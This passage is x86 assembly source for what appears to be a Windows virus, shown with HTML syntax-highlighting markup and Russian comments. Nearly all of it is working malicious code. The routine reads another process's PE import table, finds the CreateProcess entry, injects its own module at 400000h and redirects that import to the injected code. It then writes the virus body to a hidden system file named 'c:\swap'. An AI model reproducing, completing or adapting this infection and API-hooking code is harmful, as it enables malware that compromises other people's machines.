</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'RUFF'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">modentry.modBaseAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;read process header</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;указатель на PE header</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;читаем PE-header</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">fcheckerror</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;we got Import table directory address</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">;читаем каталог импорта</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;eax - import library RVA</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;читаем имя библиотечки</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">n_kernel</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">StrCompare</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">__2</span><span class="sc0">                              </span><span class="sc1">;следующая директория</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__3</span><span class="sc0">                       </span><span class="sc1">;следующая директория</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;каталог импорта для KERNEL32 найден</span><span class="sc0">
</span><span class="sc1">;в EAX - каталог импорта для KERNEL32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;в EAX - Table of Hint Names RVA's</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;читаем 4096 байт RVA HINTNAMES</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;читаем в buffer +4096</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;в eax - buffer+4096</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;читаем имя функции</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;читаем в buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">find_cp</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">sCreateProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">StrCompare</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;сравниваем имена функций</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">cp_found</span><span class="sc0">
</span><span class="sc5">again</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">go</span><span class="sc0">
</span><span class="sc5">cp_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">ch_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sDeleteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">df_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">cf_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">rf_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sGlobalAlloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">ga_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;eax=RVA of ADdress table</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">;eax=entry for CreateProcess  !!</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">base_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">cp_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;записать старый адрес ф-ии</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">old_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sReadProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;mov    eax,[sMessageBox+ebp]</span><span class="sc0">
</span><span class="sc1">;mov    [mb_addr+ebp],eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofwrt</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">           </span><span class="sc1">;записать наш код на адрес 400000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc5">module_size</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">module</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sWriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofwrt</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">          </span><span class="sc1">;заменить адрес ф-ии</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sWriteProcessMemory</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">fcheckerror</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc1">;открыть файл 'c:\swap'</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;SHARED MODE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">          </span><span class="sc1">;access</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;записать основное тело вируса туда</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;overlapped stucture = 0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nobw</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;number of bytes written</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">vir_size</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sWriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
